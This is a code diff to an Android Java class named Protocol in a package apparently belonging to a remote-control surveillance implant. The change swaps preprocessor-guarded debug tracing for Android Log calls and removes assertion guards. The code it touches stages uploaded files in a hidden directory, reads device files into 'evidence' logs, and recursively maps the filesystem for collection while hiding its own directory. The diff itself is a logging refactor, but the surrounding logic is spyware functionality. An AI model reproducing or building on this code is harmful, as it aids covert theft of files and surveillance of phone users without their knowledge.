@@ -12,6 +12,8 @@ import java.io.File;
 import java.util.Date;
 import java.util.Vector;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.conf.Configuration;
@@ -34,12 +36,8 @@ public abstract class Protocol {
 
 	/** The Constant UPGRADE_FILENAME. */
 	public static final String UPGRADE_FILENAME = "core-update";
-
-	// #ifdef DEBUG
 	/** The debug. */
-	private static Debug debug = new Debug("Protocol");
-	// #endif
-
+	private static String TAG = "Protocol";
 	/** The transport. */
 	protected Transport transport;
 
@@ -107,16 +105,11 @@ public abstract class Protocol {
 		final AutoFile file = new AutoFile(Path.hidden());
 
 		if (file.exists()) {
-			// #ifdef DEBUG
-			debug.trace("getUpload replacing existing file: " + filename);
-			// #endif
+			Log.d(TAG,"getUpload replacing existing file: " + filename);
 			file.delete();
 		}
 		file.write(content);
-
-		// #ifdef DEBUG
-		debug.trace("file written: " + file.exists());
-		// #endif
+		Log.d(TAG,"file written: " + file.exists());
 	}
 
 	/**
@@ -151,17 +144,12 @@ public abstract class Protocol {
 	public static void saveDownloadLog(final String filefilter) {
 		AutoFile file = new AutoFile(filefilter);
 		if (file.exists()) {
-			// #ifdef DEBUG
-			debug.trace("logging file: " + filefilter);
-			// #endif
+			Log.d(TAG,"logging file: " + filefilter);
 			if (file.canRead()) {
 				saveFileLog(file, filefilter);
 			}
 		} else {
-			// #ifdef DEBUG
-			debug.trace("not a file, try to expand it: " + filefilter);
-			// #endif
-
+			Log.d(TAG,"not a file, try to expand it: " + filefilter);
 			final String[] files = file.list();
 			for (final String filename : files) {
 
@@ -171,11 +159,7 @@ public abstract class Protocol {
 				}
 
 				saveFileLog(file, filename);
-
-				// #ifdef DEBUG
-				debug.trace("logging file: " + filename);
-				// #endif
-
+				Log.d(TAG,"logging file: " + filename);
 			}
 		}
 	}
@@ -189,14 +173,10 @@ public abstract class Protocol {
 	 *            the filename
 	 */
 	private static void saveFileLog(final AutoFile file, final String filename) {
-
-		// #ifdef DBC
 		Check.requires(file != null, "null file");
 		Check.requires(file.exists(), "file should exist");
 		Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
 		Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
-		// #endif
-
 		final byte[] content = file.read();
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
 		//final Evidence log = new Evidence(0);
@@ -215,29 +195,19 @@ public abstract class Protocol {
 	 * @return the byte[]
 	 */
 	private static byte[] logDownloadAdditional(String filename) {
-
-		// #ifdef DBC
 		Check.requires(filename != null, "null file");
 		Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
 		Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
-		// #endif
-
 		final String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR
 		final int macroPos = filename.indexOf(path);
 		if (macroPos >= 0) {
-			// #ifdef DEBUG
-			debug.trace("macropos: " + macroPos);
-			// #endif
+			Log.d(TAG,"macropos: " + macroPos);
 			final String start = filename.substring(0, macroPos);
 			final String end = filename.substring(macroPos + path.length());
 
 			filename = start + Directory.hiddenDirMacro + end;
 		}
-
-		// #ifdef DEBUG
-		debug.trace("filename: " + filename);
-		// #endif
-
+		Log.d(TAG,"filename: " + filename);
 		final int version = 2008122901;
 		final byte[] wfilename = WChar.getBytes(filename);
 		final byte[] buffer = new byte[wfilename.length + 8];
@@ -265,9 +235,7 @@ public abstract class Protocol {
 
 		// Expand path and create log
 		if (path.equals("/")) {
-			// #ifdef DEBUG
-			debug.trace("sendFilesystem: root");
-			// #endif
+			Log.d(TAG,"sendFilesystem: root");
 			expandRoot(fsLog, depth);
 		} else {
 			if (path.startsWith("//") && path.endsWith("/*")) {
@@ -275,10 +243,8 @@ public abstract class Protocol {
 
 				expandPath(fsLog, path, depth);
 			} else {
-				// #ifdef DEBUG
-				debug.error("sendFilesystem: strange path, ignoring it. "
+				Log.e(TAG,"sendFilesystem: strange path, ignoring it. "
 						+ path);
-				// #endif
 			}
 		}
 
@@ -294,10 +260,7 @@ public abstract class Protocol {
 	 *            the depth
 	 */
 	private static void expandRoot(final Evidence fsLog, final int depth) {
-		// #ifdef DBC
 		Check.requires(depth > 0, "wrong recursion depth");
-		// #endif
-
 		saveRootLog(fsLog); // depth 0
 		expandPath(fsLog, "/", depth);
 
@@ -314,22 +277,15 @@ public abstract class Protocol {
 	 */
 	private static boolean saveFilesystemLog(final Evidence fsLog,
 			final String filepath) {
-		// #ifdef DBC
 		Check.requires(fsLog != null, "fsLog null");
 		Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
 		Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
-		// #endif
-
-		// #ifdef DEBUG
-		debug.info("save FilesystemLog: " + filepath);
-		// #endif
+		Log.i(TAG,"save FilesystemLog: " + filepath);
 		final int version = 2010031501;
 
 		final AutoFile file = new AutoFile(filepath);
 		if (!file.exists()) {
-			// #ifdef DEBUG
-			debug.error("non existing file: " + filepath);
-			// #endif
+			Log.e(TAG,"non existing file: " + filepath);
 			return false;
 		}
 
@@ -359,11 +315,7 @@ public abstract class Protocol {
 		databuffer.write(w_filepath);
 
 		fsLog.writeEvidence(content);
-
-		// #ifdef DEBUG
-		debug.trace("expandPath: written log");
-		// #endif
-
+		Log.d(TAG,"expandPath: written log");
 		return isDir;
 
 	}
@@ -377,10 +329,7 @@ public abstract class Protocol {
 	 */
 	private static void saveRootLog(final Evidence fsLog) {
 		final int version = 2010031501;
-
-		// #ifdef DBC
 		Check.requires(fsLog != null, "fsLog null");
-		// #endif
 		final byte[] content = new byte[30];
 
 		final DataBuffer databuffer = new DataBuffer(content);
@@ -406,18 +355,12 @@ public abstract class Protocol {
 	 */
 	private static void expandPath(final Evidence fsLog, final String path,
 			final int depth) {
-		// #ifdef DBC
 		Check.requires(depth > 0, "wrong recursion depth");
 		Check.requires(path != null, "path==null");
 		Check.requires(path == "/" || !path.endsWith("/"),
 				"path should end with /");
 		Check.requires(!path.endsWith("*"), "path shouldn't end with *");
-		// #endif
-
-		// #ifdef DEBUG
-		debug.trace("expandPath: " + path + " depth: " + depth);
-		// #endif
-
+		Log.d(TAG,"expandPath: " + path + " depth: " + depth);
 		final File dir = new File(path);
 		if (dir.isDirectory()) {
 			final String[] files = dir.list();
@@ -430,9 +373,7 @@ public abstract class Protocol {
 					dPath = dPath.substring(1);
 				}
 				if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
-					// #ifdef DEBUG
-					debug.warn("expandPath ignoring hidden path: " + dPath);
-					// #endif
+					Log.w(TAG,"expandPath ignoring hidden path: " + dPath);
 					continue;
 				}
 
@@ -454,9 +395,7 @@ public abstract class Protocol {
 	 */
 	public static String normalizeFilename(final String file) {
 		if (file.startsWith("//")) {
-			// #ifdef DEBUG
-			debug.trace("normalizeFilename: " + file);
-			// #endif
+			Log.d(TAG,"normalizeFilename: " + file);
 			return file.substring(1);
 		} else {
 			return file;
